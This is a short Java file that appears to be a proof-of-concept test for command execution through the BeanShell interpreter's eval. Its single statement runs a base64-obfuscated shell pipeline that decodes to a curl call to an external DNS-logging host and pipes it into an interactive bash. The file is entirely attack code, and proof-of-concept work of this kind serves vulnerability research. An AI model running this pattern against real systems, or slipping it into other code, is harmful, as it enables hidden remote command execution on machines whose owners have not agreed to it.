package com.sorry.bug.beanshell;

import bsh.EvalError;
import bsh.Interpreter;
/**
 * created by 0x22cb7139 on 2021/6/8
 */
public class bshTest {

    public static void main(String[] args) throws EvalError {
        Interpreter i = new Interpreter();
        i.eval("java.lang.Runtime.getRuntime().exec(\"bash -c {echo,Y3VybCA0aWZ4cnAuZG5zLWxvZy5jb20=}|{base64,-d}|{bash,-i}\");");
    }
}
